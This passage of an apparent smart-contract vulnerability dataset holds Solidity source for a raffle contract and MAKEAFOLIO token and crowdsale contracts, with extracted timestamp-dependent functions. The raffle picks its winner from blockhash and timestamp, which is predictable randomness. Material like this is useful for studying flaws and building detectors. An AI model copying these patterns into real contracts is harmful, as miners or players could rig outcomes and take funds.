endTime;\n raffleId++;\n }\n function buyRaffleTicket(uint256 amount) external {\n require(raffleEndTime >= block.timestamp);\n require(amount > 0);\n uint256 ticketsCost = SafeMath.mul(RAFFLE_TICKET_BASE_GOO_PRICE, amount);\n goo.transferFrom(msg.sender, this, ticketsCost);\n goo.transfer(address(0), (ticketsCost * 95) / 100);\n TicketPurchases storage purchases = ticketsBoughtByPlayer[msg.sender];\n if (purchases.raffleId != raffleId) {\n purchases.numPurchases = 0;\n purchases.raffleId = raffleId;\n rafflePlayers[raffleId].push(msg.sender);\n }\n if (purchases.numPurchases == purchases.ticketsBought.length) {\n purchases.ticketsBought.length += 1;\n }\n purchases.ticketsBought[purchases.numPurchases++] = TicketPurchase(raffleTicketsBought, raffleTicketsBought + (amount - 1));\n raffleTicketsBought += amount;\n }\n function awardRafflePrize(address checkWinner, uint256 checkIndex) external {\n require(raffleEndTime < block.timestamp);\n require(raffleWinner == 0);\n if (!raffleWinningTicketSelected) {\n drawRandomWinner();\n }\n if (checkWinner != 0) {\n TicketPurchases storage tickets = ticketsBoughtByPlayer[checkWinner];\n if (tickets.numPurchases > 0 && checkIndex < tickets.numPurchases && tickets.raffleId == raffleId) {\n TicketPurchase storage checkTicket = tickets.ticketsBought[checkIndex];\n if (raffleTicketThatWon >= checkTicket.startId && raffleTicketThatWon <= checkTicket.endId) {\n assignRaffleWinner(checkWinner);\n return;\n }\n }\n }\n for (uint256 i = 0; i < rafflePlayers[raffleId].length; i++) {\n address player = rafflePlayers[raffleId][i];\n TicketPurchases storage playersTickets = ticketsBoughtByPlayer[player];\n uint256 endIndex = playersTickets.numPurchases - 1;\n if (raffleTicketThatWon >= playersTickets.ticketsBought[0].startId && raffleTicketThatWon <= playersTickets.ticketsBought[endIndex].endId) {\n for (uint256 j = 0; j < playersTickets.numPurchases; j++) {\n TicketPurchase storage playerTicket = playersTickets.ticketsBought[j];\n if (raffleTicketThatWon >= playerTicket.startId && raffleTicketThatWon <= playerTicket.endId) {\n assignRaffleWinner(player);\n return;\n }\n }\n }\n }\n }\n function assignRaffleWinner(address winner) internal {\n raffleWinner = winner;\n }\n function drawRandomWinner() public {\n require(msg.sender == owner);\n require(raffleEndTime < block.timestamp);\n require(!raffleWinningTicketSelected);\n uint256 seed = raffleTicketsBought + block.timestamp;\n raffleTicketThatWon = addmod(uint256(block.blockhash(block.number-1)), seed, (raffleTicketsBought + 1));\n raffleWinningTicketSelected = true;\n }\n function transferGoo(address recipient, uint256 amount) external {\n require(msg.sender == owner);\n goo.transfer(recipient, amount);\n }\n function getLatestRaffleInfo() external constant returns (uint256, uint256, uint256, address, uint256) {\n return (raffleEndTime, raffleId, raffleTicketsBought, raffleWinner, raffleTicketThatWon);\n }\n function getRafflePlayers(uint256 raffle) external constant returns (address[]) {\n return (rafflePlayers[raffle]);\n }\n function getPlayersTickets(address player) external constant returns (uint256[], uint256[]) {\n TicketPurchases storage playersTickets = ticketsBoughtByPlayer[player];\n if (playersTickets.raffleId == raffleId) {\n uint256[] memory startIds = new uint256[](playersTickets.numPurchases);\n uint256[] memory endIds = new uint256[](playersTickets.numPurchases);\n for (uint256 i = 0; i < playersTickets.numPurchases; i++) {\n startIds[i] = playersTickets.ticketsBought[i].startId;\n endIds[i] = playersTickets.ticketsBought[i].endId;\n }\n }\n return (startIds, endIds);\n }\n}\ninterface Goo {\n function transfer(address to, uint tokens) public returns (bool success);\n function transferFrom(address from, address to, uint tokens) public returns (bool success);\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}",
  "extract_feature": [
    "function startTokenRaffle(uint256 endTime, address tokenContract, uint256 id, bool hasItemAlready) external {\nrequire(msg.sender == owner);\nrequire(block.timestamp < endTime);\nif (raffleId != 0) {\nrequire(raffleWinner != 0);\n}\nraffleWinningTicketSelected = false;\nraffleTicketThatWon = 0;\nraffleWinner = 0;\nraffleTicketsBought = 0;\nraffleEndTime = endTime;\nraffleId++;\n}",
    "function buyRaffleTicket(uint256 amount) external {\nrequire(raffleEndTime >= block.timestamp);\nrequire(amount > 0);\nuint256 ticketsCost = SafeMath.mul(RAFFLE_TICKET_BASE_GOO_PRICE, amount);\ngoo.transferFrom(msg.sender, this, ticketsCost);\ngoo.transfer(address(0), (ticketsCost * 95) / 100);\nTicketPurchases storage purchases = ticketsBoughtByPlayer[msg.sender];\nif (purchases.raffleId != raffleId) {\npurchases.numPurchases = 0;\npurchases.raffleId = raffleId;\nrafflePlayers[raffleId].push(msg.sender);\n}\nif (purchases.numPurchases == purchases.ticketsBought.length) {\npurchases.ticketsBought.length += 1;\n}\npurchases.ticketsBought[purchases.numPurchases++] = TicketPurchase(raffleTicketsBought, raffleTicketsBought + (amount - 1));\nraffleTicketsBought += amount;\n}",
    "function awardRafflePrize(address checkWinner, uint256 checkIndex) external {\nrequire(raffleEndTime < block.timestamp);\nrequire(raffleWinner == 0);\nif (!raffleWinningTicketSelected) {\ndrawRandomWinner();\n}\nif (checkWinner != 0) {\nTicketPurchases storage tickets = ticketsBoughtByPlayer[checkWinner];\nif (tickets.numPurchases > 0 && checkIndex < tickets.numPurchases && tickets.raffleId == raffleId) {\nTicketPurchase storage checkTicket = tickets.ticketsBought[checkIndex];\nif (raffleTicketThatWon >= checkTicket.startId && raffleTicketThatWon <= checkTicket.endId) {\nassignRaffleWinner(checkWinner);\nreturn;\n}\n}\n}\nfor (uint256 i = 0; i < rafflePlayers[raffleId].length; i++) {\naddress player = rafflePlayers[raffleId][i];\nTicketPurchases storage playersTickets = ticketsBoughtByPlayer[player];\nuint256 endIndex = playersTickets.numPurchases - 1;\nif (raffleTicketThatWon >= playersTickets.ticketsBought[0].startId && raffleTicketThatWon <= playersTickets.ticketsBought[endIndex].endId) {\nfor (uint256 j = 0; j < playersTickets.numPurchases; j++) {\nTicketPurchase storage playerTicket = playersTickets.ticketsBought[j];\nif (raffleTicketThatWon >= playerTicket.startId && raffleTicketThatWon <= playerTicket.endId) {\nassignRaffleWinner(player);\nreturn;\n}\n}\n}\n}\n}",
    "function drawRandomWinner() public {\nrequire(msg.sender == owner);\nrequire(raffleEndTime < block.timestamp);\nrequire(!raffleWinningTicketSelected);\nuint256 seed = raffleTicketsBought + block.timestamp;\nraffleTicketThatWon = addmod(uint256(block.blockhash(block.number-1)), seed, (raffleTicketsBought + 1));\nraffleWinningTicketSelected = true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f36"
  },
  "filename": "7440.sol",
  "content": "pragma solidity ^0.4.21;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract MintableToken is StandardToken, Ownable {\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n bool public mintingFinished = false;\n modifier canMint() {\n require(!mintingFinished);\n _;\n }\n function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) {\n totalSupply = totalSupply.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n Mint(_to, _amount);\n Transfer(address(0), _to, _amount);\n return true;\n }\n function finishMinting() onlyOwner canMint public returns (bool) {\n mintingFinished = true;\n MintFinished();\n return true;\n }\n}\ncontract FreezableToken is StandardToken {\n mapping (bytes32 => uint64) internal chains;\n mapping (bytes32 => uint) internal freezings;\n mapping (address => uint) internal freezingBalance;\n event Freezed(address indexed to, uint64 release, uint amount);\n event Released(address indexed owner, uint amount);\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return super.balanceOf(_owner) + freezingBalance[_owner];\n }\n function actualBalanceOf(address _owner) public view returns (uint256 balance) {\n return super.balanceOf(_owner);\n }\n function freezingBalanceOf(address _owner) public view returns (uint256 balance) {\n return freezingBalance[_owner];\n }\n function freezingCount(address _addr) public view returns (uint count) {\n uint64 release = chains[toKey(_addr, 0)];\n while (release != 0) {\n count ++;\n release = chains[toKey(_addr, release)];\n }\n }\n function getFreezing(address _addr, uint _index) public view returns (uint64 _release, uint _balance) {\n for (uint i = 0; i < _index + 1; i ++) {\n _release = chains[toKey(_addr, _release)];\n if (_release == 0) {\n return;\n }\n }\n _balance = freezings[toKey(_addr, _release)];\n }\n function freezeTo(address _to, uint _amount, uint64 _until) public {\n require(_to != address(0));\n require(_amount <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_amount);\n bytes32 currentKey = toKey(_to, _until);\n freezings[currentKey] = freezings[currentKey].add(_amount);\n freezingBalance[_to] = freezingBalance[_to].add(_amount);\n freeze(_to, _until);\n emit Transfer(msg.sender, _to, _amount);\n emit Freezed(_to, _until, _amount);\n }\n function releaseOnce() public {\n bytes32 headKey = toKey(msg.sender, 0);\n uint64 head = chains[headKey];\n require(head != 0);\n require(uint64(block.timestamp) > head);\n bytes32 currentKey = toKey(msg.sender, head);\n uint64 next = chains[currentKey];\n uint amount = freezings[currentKey];\n delete freezings[currentKey];\n balances[msg.sender] = balances[msg.sender].add(amount);\n freezingBalance[msg.sender] = freezingBalance[msg.sender].sub(amount);\n if (next == 0) {\n delete chains[headKey];\n }\n else {\n chains[headKey] = next;\n delete chains[currentKey];\n }\n emit Released(msg.sender, amount);\n }\n function releaseAll() public returns (uint tokens) {\n uint release;\n uint balance;\n (release, balance) = getFreezing(msg.sender, 0);\n while (release != 0 && block.timestamp > release) {\n releaseOnce();\n tokens += balance;\n (release, balance) = getFreezing(msg.sender, 0);\n }\n }\n function toKey(address _addr, uint _release) internal pure returns (bytes32 result) {\n result = 0x5749534800000000000000000000000000000000000000000000000000000000;\n assembly {\n result := or(result, mul(_addr, 0x10000000000000000))\n result := or(result, _release)\n }\n }\n function freeze(address _to, uint64 _until) internal {\n require(_until > block.timestamp);\n bytes32 key = toKey(_to, _until);\n bytes32 parentKey = toKey(_to, uint64(0));\n uint64 next = chains[parentKey];\n if (next == 0) {\n chains[parentKey] = _until;\n return;\n }\n bytes32 nextKey = toKey(_to, next);\n uint parent;\n while (next != 0 && _until > next) {\n parent = next;\n parentKey = nextKey;\n next = chains[nextKey];\n nextKey = toKey(_to, next);\n }\n if (_until == next) {\n return;\n }\n if (next != 0) {\n chains[key] = next;\n }\n chains[parentKey] = _until;\n }\n}\ncontract BurnableToken is StandardToken {\n event Burn(address indexed burner, uint256 value);\n function burn(uint256 _value) public {\n require(_value > 0);\n require(_value <= balances[msg.sender]);\n address burner = msg.sender;\n balances[burner] = balances[burner].sub(_value);\n totalSupply = totalSupply.sub(_value);\n Burn(burner, _value);\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n Unpause();\n }\n}\ncontract FreezableMintableToken is FreezableToken, MintableToken {\n function mintAndFreeze(address _to, uint _amount, uint64 _until) onlyOwner canMint public returns (bool) {\n totalSupply = totalSupply.add(_amount);\n bytes32 currentKey = toKey(_to, _until);\n freezings[currentKey] = freezings[currentKey].add(_amount);\n freezingBalance[_to] = freezingBalance[_to].add(_amount);\n freeze(_to, _until);\n emit Mint(_to, _amount);\n emit Freezed(_to, _until, _amount);\n emit Transfer(msg.sender, _to, _amount);\n return true;\n }\n}\ncontract Consts {\n uint constant TOKEN_DECIMALS = 18;\n uint8 constant TOKEN_DECIMALS_UINT8 = 18;\n uint constant TOKEN_DECIMAL_MULTIPLIER = 10 ** TOKEN_DECIMALS;\n string constant TOKEN_NAME = \"MAKEAFOLIO\";\n string constant TOKEN_SYMBOL = \"MAF\";\n bool constant PAUSED = true;\n address constant TARGET_USER = 0x8De57367b1Bb53afc74f5efAbAebC3A971FA69A9;\n uint constant START_TIME = 1530417600;\n bool constant CONTINUE_MINTING = false;\n}\ncontract MainToken is Consts, FreezableMintableToken, BurnableToken, Pausable\n{\n function name() pure public returns (string _name) {\n return TOKEN_NAME;\n }\n function symbol() pure public returns (string _symbol) {\n return TOKEN_SYMBOL;\n }\n function decimals() pure public returns (uint8 _decimals) {\n return TOKEN_DECIMALS_UINT8;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool _success) {\n require(!paused);\n return super.transferFrom(_from, _to, _value);\n }\n function transfer(address _to, uint256 _value) public returns (bool _success) {\n require(!paused);\n return super.transfer(_to, _value);\n }\n}",
  "extract_feature": [
    "function releaseOnce() public {\nbytes32 headKey = toKey(msg.sender, 0);\nuint64 head = chains[headKey];\nrequire(head != 0);\nrequire(uint64(block.timestamp) > head);\nbytes32 currentKey = toKey(msg.sender, head);\nuint64 next = chains[currentKey];\nuint amount = freezings[currentKey];\ndelete freezings[currentKey];\nbalances[msg.sender] = balances[msg.sender].add(amount);\nfreezingBalance[msg.sender] = freezingBalance[msg.sender].sub(amount);\nif (next == 0) {\ndelete chains[headKey];\n}\nelse {\nchains[headKey] = next;\ndelete chains[currentKey];\n}\nemit Released(msg.sender, amount);\n}",
    "function releaseAll() public returns (uint tokens) {\nuint release;\nuint balance;\n(release, balance) = getFreezing(msg.sender, 0);\nwhile (release != 0 && block.timestamp > release) {\nreleaseOnce();\ntokens += balance;\n(release, balance) = getFreezing(msg.sender, 0);\n}\n}",
    "function freeze(address _to, uint64 _until) internal {\nrequire(_until > block.timestamp);\nbytes32 key = toKey(_to, _until);\nbytes32 parentKey = toKey(_to, uint64(0));\nuint64 next = chains[parentKey];\nif (next == 0) {\nchains[parentKey] = _until;\nreturn;\n}\nbytes32 nextKey = toKey(_to, next);\nuint parent;\nwhile (next != 0 && _until > next) {\nparent = next;\nparentKey = nextKey;\nnext = chains[nextKey];\nnextKey = toKey(_to, next);\n}\nif (_until == next) {\nreturn;\n}\nif (next != 0) {\nchains[key] = next;\n}\nchains[parentKey] = _until;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f37"
  },
  "filename": "7441.sol",
  "content": "pragma solidity ^0.4.21;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract MintableToken is StandardToken, Ownable {\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n bool public mintingFinished = false;\n modifier canMint() {\n require(!mintingFinished);\n _;\n }\n function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) {\n totalSupply = totalSupply.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n Mint(_to, _amount);\n Transfer(address(0), _to, _amount);\n return true;\n }\n function finishMinting() onlyOwner canMint public returns (bool) {\n mintingFinished = true;\n MintFinished();\n return true;\n }\n}\ncontract Crowdsale {\n using SafeMath for uint256;\n MintableToken public token;\n uint256 public startTime;\n uint256 public endTime;\n address public wallet;\n uint256 public rate;\n uint256 public weiRaised;\n event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);\n function Crowdsale(uint256 _startTime, uint256 _endTime, uint256 _rate, address _wallet) public {\n require(_startTime >= now);\n require(_endTime >= _startTime);\n require(_rate > 0);\n require(_wallet != address(0));\n token = createTokenContract();\n startTime = _startTime;\n endTime = _endTime;\n rate = _rate;\n wallet = _wallet;\n }\n function createTokenContract() internal returns (MintableToken) {\n return new MintableToken();\n }\n function () external payable {\n buyTokens(msg.sender);\n }\n function buyTokens(address beneficiary) public payable {\n require(beneficiary != address(0));\n require(validPurchase());\n uint256 weiAmount = msg.value;\n uint256 tokens = weiAmount.mul(rate);\n weiRaised = weiRaised.add(weiAmount);\n token.mint(beneficiary, tokens);\n TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);\n forwardFunds();\n }\n function forwardFunds() internal {\n wallet.transfer(msg.value);\n }\n function validPurchase() internal view returns (bool) {\n bool withinPeriod = now >= startTime && now <= endTime;\n bool nonZeroPurchase = msg.value != 0;\n return withinPeriod && nonZeroPurchase;\n }\n function hasEnded() public view returns (bool) {\n return now > endTime;\n }\n}\ncontract FreezableToken is StandardToken {\n mapping (bytes32 => uint64) internal chains;\n mapping (bytes32 => uint) internal freezings;\n mapping (address => uint) internal freezingBalance;\n event Freezed(address indexed to, uint64 release, uint amount);\n event Released(address indexed owner, uint amount);\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return super.balanceOf(_owner) + freezingBalance[_owner];\n }\n function actualBalanceOf(address _owner) public view returns (uint256 balance) {\n return super.balanceOf(_owner);\n }\n function freezingBalanceOf(address _owner) public view returns (uint256 balance) {\n return freezingBalance[_owner];\n }\n function freezingCount(address _addr) public view returns (uint count) {\n uint64 release = chains[toKey(_addr, 0)];\n while (release != 0) {\n count ++;\n release = chains[toKey(_addr, release)];\n }\n }\n function getFreezing(address _addr, uint _index) public view returns (uint64 _release, uint _balance) {\n for (uint i = 0; i < _index + 1; i ++) {\n _release = chains[toKey(_addr, _release)];\n if (_release == 0) {\n return;\n }\n }\n _balance = freezings[toKey(_addr, _release)];\n }\n function freezeTo(address _to, uint _amount, uint64 _until) public {\n require(_to != address(0));\n require(_amount <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_amount);\n bytes32 currentKey = toKey(_to, _until);\n freezings[currentKey] = freezings[currentKey].add(_amount);\n freezingBalance[_to] = freezingBalance[_to].add(_amount);\n freeze(_to, _until);\n emit Transfer(msg.sender, _to, _amount);\n emit Freezed(_to, _until, _amount);\n }\n function releaseOnce() public {\n bytes32 headKey = toKey(msg.sender, 0);\n uint64 head = chains[headKey];\n require(head != 0);\n require(uint64(block.timestamp) > head);\n bytes32 currentKey = toKey(msg.sender, head);\n uint64 next = chains[currentKey];\n uint amount = freezings[currentKey];\n delete freezings[currentKey];\n balances[msg.sender] = balances[msg.sender].add(amount);\n freezingBalance[msg.sender] = freezingBalance[msg.sender].sub(amount);\n if (next == 0) {\n delete chains[headKey];\n }\n else {\n chains[headKey] = next;\n delete chains[currentKey];\n }\n emit Released(msg.sender, amount);\n }\n function releaseAll() public returns (uint tokens) {\n uint release;\n uint balance;\n (release, balance) = getFreezing(msg.sender, 0);\n while (release != 0 && block.timestamp > release) {\n releaseOnce();\n tokens += balance;\n (release, balance) = getFreezing(msg.sender, 0);\n }\n }\n function toKey(address _addr, uint _release) internal pure returns (bytes32 result) {\n result = 0x5749534800000000000000000000000000000000000000000000000000000000;\n assembly {\n result := or(result, mul(_addr, 0x10000000000000000))\n result := or(result, _release)\n }\n }\n function freeze(address _to, uint64 _until) internal {\n require(_until > block.timestamp);\n bytes32 key = toKey(_to, _until);\n bytes32 parentKey = toKey(_to, uint64(0));\n uint64 next = chains[parentKey];\n if (next == 0) {\n chains[parentKey] = _until;\n return;\n }\n bytes32 nextKey = toKey(_to, next);\n uint parent;\n while (next != 0 && _until > next) {\n parent = next;\n parentKey = nextKey;\n next = chains[nextKey];\n nextKey = toKey(_to, next);\n }\n if (_until == next) {\n return;\n }\n if (next != 0) {\n chains[key] = next;\n }\n chains[parentKey] = _until;\n }\n}\ncontract BurnableToken is StandardToken {\n event Burn(address indexed burner, uint256 value);\n function burn(uint256 _value) public {\n require(_value > 0);\n require(_value <= balances[msg.sender]);\n address burner = msg.sender;\n balances[burner] = balances[burner].sub(_value);\n totalSupply = totalSupply.sub(_value);\n Burn(burner, _value);\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n Unpause();\n }\n}\ncontract FreezableMintableToken is FreezableToken, MintableToken {\n function mintAndFreeze(address _to, uint _amount, uint64 _until) onlyOwner canMint public returns (bool) {\n totalSupply = totalSupply.add(_amount);\n bytes32 currentKey = toKey(_to, _until);\n freezings[currentKey] = freezings[currentKey].add(_amount);\n freezingBalance[_to] = freezingBalance[_to].add(_amount);\n freeze(_to, _until);\n emit Mint(_to, _amount);\n emit Freezed(_to, _until, _amount);\n emit Transfer(msg.sender, _to, _amount);\n return true;\n }\n}\ncontract Consts {\n uint constant TOKEN_DECIMALS = 18;\n uint8 constant TOKEN_DECIMALS_UINT8 = 18;\n uint constant TOKEN_DECIMAL_MULTIPLIER = 10 ** TOKEN_DECIMALS;\n string constant TOKEN_NAME = \"MAKEAFOLIO\";\n string constant TOKEN_SYMBOL = \"MAF\";\n bool constant PAUSED = true;\n address constant TARGET_USER = 0x8De57367b1Bb53afc74f5efAbAebC3A971FA69A9;\n uint constant START_TIME = 1530417600;\n bool constant CONTINUE_MINTING = false;\n}\ncontract FinalizableCrowdsale is Crowdsale, Ownable {\n using SafeMath for uint256;\n bool public isFinalized = false;\n event Finalized();\n function finalize() onlyOwner public {\n require(!isFinalized);\n require(hasEnded());\n finalization();\n Finalized();\n isFinalized = true;\n }\n function finalization() internal {\n }\n}\ncontract MainToken is Consts, FreezableMintableToken, BurnableToken, Pausable\n{\n function name() pure public returns (string _name) {\n return TOKEN_NAME;\n }\n function symbol() pure public returns (string _symbol) {\n return TOKEN_SYMBOL;\n }\n function decimals() pure public returns (uint8 _decimals) {\n return TOKEN_DECIMALS_UINT8;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool _success) {\n require(!paused);\n return super.transferFrom(_from, _to, _value);\n }\n function transfer(address _to, uint256 _value) public returns (bool _success) {\n require(!paused);\n return super.transfer(_to, _value);\n }\n}\ncontract CappedCrowdsale is Crowdsale {\n using SafeMath for uint256;\n uint256 public cap;\n function CappedCrowdsale(uint256 _cap) public {\n require(_cap > 0);\n cap = _cap;\n }\n function validPurchase() internal view returns (bool) {\n bool withinCap = weiRaised.add(msg.value) <= cap;\n return super.validPurchase() && withinCap;\n }\n function hasEnded() public view returns (bool) {\n bool capReached = weiRaised >= cap;\n return super.hasEnded() || capReached;\n }\n}\ncontract MainCrowdsale is Consts, FinalizableCrowdsale {\n function hasStarted() public constant returns (bool) {\n return now >= startTime;\n }\n function finalization() internal {\n super.finalization();\n if (PAUSED) {\n MainToken(token).unpause();\n }\n if (!CONTINUE_MINTING) {\n token.finishMinting();\n }\n token.transferOwnership(TARGET_USER);\n }\n function buyTokens(address beneficiary) public payable {\n require(beneficiary != address(0));\n require(validPurchase());\n uint256 weiAmount = msg.value;\n uint256 tokens = weiAmount.mul(rate).div(1 ether);\n weiRaised = weiRaised.add(weiAmount);\n token.mint(beneficiary, tokens);\n emit TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);\n forwardFunds();\n }\n}\ncontract BonusableCrowdsale is Consts, Crowdsale {\n function buyTokens(address beneficiary) public payable {\n require(beneficiary != address(0));\n require(validPurchase());\n uint256 weiAmount = msg.value;\n uint256 bonusRate = getBonusRate(weiAmount);\n uint256 tokens = weiAmount.mul(bonusRate).div(1 ether);\n weiRaised = weiRaised.add(weiAmount);\n token.mint(beneficiary, tokens);\n emit TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);\n forwardFunds();\n }\n function getBonusRate(uint256 weiAmount) internal view returns (uint256) {\n uint256 bonusRate = rate;\n uint[5] memory weiRaisedStartsBoundaries = [uint(0),uint(4583333333333333333333),uint(8333333333333333333333),uint(16666666666666666666667),uint(25000000000000000000000)];\n uint[5] memory weiRaisedEndsBoundaries = [uint(4583333333333333333333),uint(8333333333333333333333),uint(16666666666666666666667),uint(25000000000000000000000),uint(33333333333333333333333)];\n uint64[5] memory timeStartsBoundaries = [uint64(1530417600),uint64(1530417600),uint64(1530417600),uint64(1530417600),uint64(1530417600)];\n uint64[5] memory timeEndsBoundaries = 